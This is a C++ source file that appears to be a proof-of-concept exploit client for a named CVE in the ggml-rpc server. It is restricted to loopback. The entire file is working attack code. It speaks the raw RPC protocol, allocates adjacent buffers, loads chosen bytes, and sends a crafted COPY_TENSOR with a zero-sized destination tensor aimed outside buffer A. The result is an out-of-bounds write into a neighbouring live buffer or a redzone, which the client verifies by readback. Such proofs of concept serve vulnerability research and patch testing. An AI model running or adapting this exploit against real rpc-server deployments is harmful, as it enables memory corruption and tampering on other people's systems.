// Raw TCP ggml-rpc client for CVE-2026-137567 (loopback only).
// Structs are verbatim from pinned b11450 ggml/src/ggml-rpc/ggml-rpc.cpp:
// packed rpc_tensor (296 bytes) and the five command messages used here.
// Modes: readback (write below A's base into live buffer B, read via B),
//        asan (write into A's left redzone), safe (in-bounds copy).
#include <arpa/inet.h>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

#define GGML_MAX_DIMS 4
#define GGML_MAX_SRC 10
#define GGML_MAX_OP_PARAMS 64
#define GGML_MAX_NAME 64

#pragma pack(push, 1)
struct rpc_tensor {
    uint64_t id;
    uint32_t type;
    uint64_t buffer;
    uint32_t ne[GGML_MAX_DIMS];
    uint32_t nb[GGML_MAX_DIMS];
    uint32_t op;
    int32_t op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];
    int32_t flags;
    uint64_t src[GGML_MAX_SRC];
    uint64_t view_src;
    uint64_t view_offs;
    uint64_t data;
    char name[GGML_MAX_NAME];
    int32_t use_count;
};
struct alloc_req { uint32_t device; uint64_t size; };
struct alloc_rsp { uint64_t remote_ptr; uint64_t remote_size; };
struct base_req { uint64_t remote_ptr; };
struct base_rsp { uint64_t base_ptr; };
struct copy_req { rpc_tensor src; rpc_tensor dst; };
struct copy_rsp { uint8_t result; };
struct get_req { rpc_tensor tensor; uint64_t offset; uint64_t size; };
#pragma pack(pop)

static_assert(sizeof(rpc_tensor) == 296, "rpc_tensor layout");
static_assert(sizeof(copy_req) == 592, "copy_req layout");

enum { C_ALLOC = 0, C_BASE = 3, C_SET = 6, C_GET = 8, C_COPY = 9, C_HELLO = 14 };

static int fd = -1;
static void die(const char * what) { perror(what); exit(2); }
static bool send_all(const void * p, size_t n) {
    const uint8_t * b = (const uint8_t *) p;
    while (n) { ssize_t k = write(fd, b, n); if (k <= 0) return false; b += k; n -= (size_t) k; }
    return true;
}
static bool recv_all(void * p, size_t n) {
    uint8_t * b = (uint8_t *) p;
    while (n) { ssize_t k = read(fd, b, n); if (k <= 0) return false; b += k; n -= (size_t) k; }
    return true;
}
static bool send_msg(const void * body, size_t n) {
    uint64_t sz = n;
    return send_all(&sz, sizeof(sz)) && (!n || send_all(body, n));
}
static bool recv_msg(void * body, size_t n) {
    uint64_t sz = 0;
    if (!recv_all(&sz, sizeof(sz)) || sz != n) { fprintf(stderr, "bad msg size %llu (want %zu)\n", (unsigned long long) sz, n); return false; }
    return !n || recv_all(body, n);
}

static rpc_tensor tensor(uint64_t handle, uint64_t data, uint32_t ne0) {
    rpc_tensor t{};
    t.id = 1;
    t.type = 0;                 // GGML_TYPE_F32
    t.buffer = handle;
    t.ne[0] = ne0; t.ne[1] = t.ne[2] = t.ne[3] = 1;
    t.nb[0] = 4; t.nb[1] = 4 * ne0; t.nb[2] = t.nb[1]; t.nb[3] = t.nb[1];
    t.data = data;
    return t;
}
static rpc_tensor zero_tensor(uint64_t handle, uint64_t data) {
    rpc_tensor t = tensor(handle, data, 0);
    t.id = 2;
    for (int i = 0; i < GGML_MAX_DIMS; i++) { t.ne[i] = 0; t.nb[i] = 0; }
    return t;
}

int main(int argc, char ** argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s PORT MODE [TARGET_HEX]\n", argv[0]); return 2; }
    int port = atoi(argv[1]);
    std::string mode = argv[2];
    uint64_t forced_target = argc > 3 ? strtoull(argv[3], nullptr, 0) : 0;

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET; sa.sin_port = htons(port); sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) die("socket");
    if (connect(fd, (struct sockaddr *) &sa, sizeof(sa))) die("connect");

    uint8_t cmd = C_HELLO;
    uint8_t caps[24] = {};
    uint64_t hello_size = sizeof(caps);
    if (!send_all(&cmd, 1) || !send_all(&hello_size, sizeof(hello_size)) || !send_all(caps, sizeof(caps))) die("HELLO send");
    uint64_t rsp_size = 0;
    uint8_t hello_rsp[32] = {};
    if (!recv_all(&rsp_size, sizeof(rsp_size)) || rsp_size != 28 || !recv_all(hello_rsp, 28)) die("HELLO recv");
    printf("HELLO v%u.%u.%u\n", hello_rsp[0], hello_rsp[1], hello_rsp[2]);

    // Allocate B first (adjacent, lower address in the plain build), then A.
    cmd = C_ALLOC; alloc_req ar{0, 4096}; alloc_rsp ab{}, aa{};
    if (!send_all(&cmd, 1) || !send_msg(&ar, sizeof(ar)) || !recv_msg(&ab, sizeof(ab))) die("alloc B");
    printf("B handle=0x%llx size=%llu\n", (unsigned long long) ab.remote_ptr, (unsigned long long) ab.remote_size);
    if (!send_all(&cmd, 1) || !send_msg(&ar, sizeof(ar)) || !recv_msg(&aa, sizeof(aa))) die("alloc A");
    printf("A handle=0x%llx size=%llu\n", (unsigned long long) aa.remote_ptr, (unsigned long long) aa.remote_size);

    cmd = C_BASE; base_req br{ab.remote_ptr}; base_rsp bb{}, ba{};
    if (!send_all(&cmd, 1) || !send_msg(&br, sizeof(br)) || !recv_msg(&bb, sizeof(bb))) die("base B");
    br.remote_ptr = aa.remote_ptr;
    if (!send_all(&cmd, 1) || !send_msg(&br, sizeof(br)) || !recv_msg(&ba, sizeof(ba))) die("base A");
    printf("B base=0x%llx A base=0x%llx\n", (unsigned long long) bb.base_ptr, (unsigned long long) ba.base_ptr);

    // Load chosen source bytes into A+64 via SET_TENSOR.
    const uint8_t chosen[16] = { 0x41, 0x42, 0x43, 0x44, 0x5a, 0x5a, 0x44, 0x44,
                                 0x11, 0x22, 0x33, 0x44, 0xee, 0xee, 0xff, 0x00 };
    rpc_tensor src = tensor(aa.remote_ptr, ba.base_ptr + 64, 4);
    std::string body;
    body.append((const char *) &src, sizeof(src));
    uint8_t cache_flag = 0;
    uint64_t offset = 0;
    body.append((const char *) &cache_flag, 1);
    body.append((const char *) &offset, sizeof(offset));
    body.append((const char *) chosen, sizeof(chosen));
    cmd = C_SET;
    if (!send_all(&cmd, 1) || !send_msg(body.data(), body.size())) die("SET_TENSOR");

    uint64_t target = forced_target;
    if (!target) {
        if (mode == "readback") target = bb.base_ptr + 64;   // live adjacent buffer B
        else if (mode == "asan") target = ba.base_ptr - 16;   // A's left ASan redzone
        else target = ba.base_ptr + 128;                      // in bounds of A
    }
    printf("target=0x%llx mode=%s\n", (unsigned long long) target, mode.c_str());

    copy_req cr{};
    cr.src = src;
    cr.dst = zero_tensor(aa.remote_ptr, target);
    copy_rsp cres{};
    cmd = C_COPY;
    bool sent = send_all(&cmd, 1) && send_msg(&cr, sizeof(cr)) && recv_msg(&cres, sizeof(cres));
    if (!sent) { fprintf(stderr, "COPY_TENSOR failed (server closed connection)\n"); close(fd); return 1; }
    printf("copy result=%u\n", cres.result);

    // Readback through the handle whose buffer really owns the target address.
    uint64_t read_handle = mode == "readback" ? ab.remote_ptr : aa.remote_ptr;
    uint64_t read_addr   = mode == "readback" ? target : (mode == "safe" ? target : ba.base_ptr + 64);
    get_req gr{};
    gr.tensor = tensor(read_handle, read_addr, 4);
    gr.offset = 0; gr.size = 16;
    uint8_t out[16] = {};
    cmd = C_GET;
    if (!send_all(&cmd, 1) || !send_msg(&gr, sizeof(gr)) || !recv_msg(out, sizeof(out))) {
        fprintf(stderr, "GET_TENSOR failed (server closed connection)\n"); close(fd); return 1;
    }
    printf("readback=");
    for (uint8_t b : out) printf("%02x", b);
    printf("\n");
    if (!memcmp(out, chosen, sizeof(chosen))) { printf("MATCH chosen bytes\n"); close(fd); return 0; }
    printf("MISMATCH\n");
    close(fd);
    return 1;
}
